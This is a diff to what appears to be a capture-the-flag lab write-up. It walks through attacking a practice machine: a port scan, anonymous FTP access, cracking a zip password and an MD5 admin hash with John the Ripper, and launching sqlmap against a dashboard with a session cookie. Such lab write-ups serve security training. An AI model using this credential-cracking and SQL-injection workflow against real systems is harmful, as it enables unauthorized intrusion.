@@ -4256,7 +4256,7 @@ The first step is listing the available information given in this scenario. We c
 
 Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
 
-First we can try to see if we can make contact with the machine with a ping request.
+For this attempt, we will use an NMAP automator script to make out job easier. This script will handle pings, port scans, directory busting, and vulnerability analysis of the target server. The results of the scan are:
 
 ```
 └─$ ./nmapAutomator.sh --host 10.129.187.99 --type All
@@ -4312,19 +4312,6 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-
-
-
----------------------Starting Full Scan------------------------
-                                                                                                                                                                  
-
-
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
-80/tcp open  http
-
-
                                                                                                                                           
 
 ---------------------Starting Vulns Scan-----------------------
@@ -4359,12 +4346,7 @@ PORT   STATE SERVICE VERSION
 |       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
 |_      1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-
-
-Running Vuln scan on all ports
-This may take a while, depending on the number of detected services..                                                                                             
-                                                                                                                                                                  
+          
 
 
 PORT   STATE SERVICE VERSION
@@ -4437,29 +4419,8 @@ PORT   STATE SERVICE VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 
-
-
----------------------Recon Recommendations---------------------
-                                                                                                                                                                  
-
-Web Servers Recon:
-                                                                                                                                                                  
-nikto -host "http://10.129.187.99:80" | tee "recon/nikto_10.129.187.99_80.txt"
-ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '.php' -u "http://10.129.187.99:80/FUZZ" | tee "recon/ffuf_10.129.187.99_80.txt"
-
-
-
-
-
-Which commands would you like to run?                                                                                                                             
-All (Default), ffuf, nikto, Skip <!>
-
-Running Default in (1)s: 
-
-
 ---------------------Running Recon Commands--------------------
-                                                                                                                                                                  
-
+                                                                                                                                                                 
 Starting nikto scan
                                                                                                                                                                   
 - Nikto v2.1.6
@@ -4476,9 +4437,16 @@ Starting nikto scan
 + Cookie PHPSESSID created without the httponly flag
 ```
 
+We can see here our scan revealed a number of outstanding issues. We have a webserver, FTP, and SSH services running.
+
+ 1. The FTP server can be accessed with the anonymous login
+ 2. There are numerous CVE vulnerabilites to be explored for both SSH and the webserver
+
+Since we can access the ftp server easily, we can start there:
 
 ```
 └─$ ftp 10.129.187.99
+
 Connected to 10.129.187.99.
 220 (vsFTPd 3.0.3)
 Name (10.129.187.99:kali): anonymous
@@ -4487,47 +4455,47 @@ Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
+
 ftp> dir
+
 229 Entering Extended Passive Mode (|||10235|)
 150 Here comes the directory listing.
 -rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
 226 Directory send OK.
+
 ftp> get backup.zip
+
 local: backup.zip remote: backup.zip
 229 Entering Extended Passive Mode (|||10583|)
 150 Opening BINARY mode data connection for backup.zip (2533 bytes).
 100% |********************************************************************************************************************|  2533      116.83 KiB/s    00:00 ETA
 226 Transfer complete.
 2533 bytes received in 00:00 (20.68 KiB/s)
-ftp> 
-ftp> 
+
 zsh: suspended  ftp 10.129.187.99
 ```
+There appeared to be one file that could be extracted, a ```backup.zip``` file.
+
+Unfortunately, it appears this file is locked behind a password. We can try next to crack it using John the Ripper:
 
 ```
-└─$ sudo zip2john backup.zip > backup.txt                
-[sudo] password for kali: 
+└─$ sudo zip2john backup.zip > backup.txt 
+               
+
 Created directory: /root/.john
 ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
 ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
 NOTE: It is assumed that all files in each archive have the same password.
 If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
-                                                                                                                                                                 
-┌──(kali㉿kali)-[~]
-└─$ ls
-allowed.userlist         backup.zip  Documents  hash.txt             Music     prae.py         __pycache__  steganography-png-decoder  winPEASx64.exe
-allowed.userlist.passwd  commands    Downloads  hs_err_pid80959.log  nc64.exe  prod.dtsConfig  scripts      Templates
-backup.txt               Desktop     flag.txt   impacket             Pictures  Public          secret.txt   Videos
-                                                                                                                                                                 
+                                                                                                                                                                          
 ┌──(kali㉿kali)-[~]
 └─$ cat backup.txt             
 backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip
                                                                                                                                             
-```
+
+└─$ john -w=/usr/share/wordlists/rockyou.txt backup.txt
  
-```
-└─$ john -w=/usr/share/wordlists/rockyou.txt backup.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 8 OpenMP threads
@@ -4537,17 +4505,24 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+It appears the cracking is successful, and we uncovered the file password to be: ```741852963```.
+
+We can now attempt to unzip the file and view the contents:
+
 
 ```
 Archive:  backup.zip
 [backup.zip] index.php password: 
   inflating: index.php               
-  inflating: style.css               
-                        
+  inflating: style.css                                      
 ```
+We can see we uncovered two files ```index.php``` and ```style.css```. 
+
+Let's analyze index.php as that is the more important one:
 
 ```
 cat index.php 
+
 <!DOCTYPE html>
 <?php
 session_start();
@@ -4601,11 +4576,13 @@ session_start();
 </body>
 </html>
 ```
+Post analysis, we see a potential username and password combination in the file. The password appears to be hashed using MD5:
 
 ```
 USERNAME: admin
 PASSWORD: 2cb42f8734ea607eefed3b70af13bbd3 (MD5)
 ```
+We can try using John the Ripper again to crack the hash, this time specifying MD5:
 
 ```
 └─$ echo 2cb42f8734ea607eefed3b70af13bbd3 > admin.txt
@@ -4620,9 +4597,19 @@ qwerty789        (?)
 1g 0:00:00:00 DONE (2022-07-30 18:39) 100.0g/s 10022Kp/s 10022Kc/s 10022KC/s roslin..pogimo
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed. 
+```
+Our crack appears to be successful, we now have the credentials:
 
 ```
+USERNAME: admin
+PASSWORD: qwerty789
+```
+We can can now make use of them and try them in an alternative service. Loading up the webpage, we are greeted with a login:
+
 ![Screenshot_2022-07-30_19_21_34](https://user-images.githubusercontent.com/59018247/182003349-36a91b6e-ad5c-4cc8-aa31-38e11f2f9a24.png)
+
+
+![Screenshot_2022-07-31_08_27_33](https://user-images.githubusercontent.com/59018247/182026361-5034b09d-592d-4fe0-920d-624da8934d6c.png)
 
 ```
 └─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh"
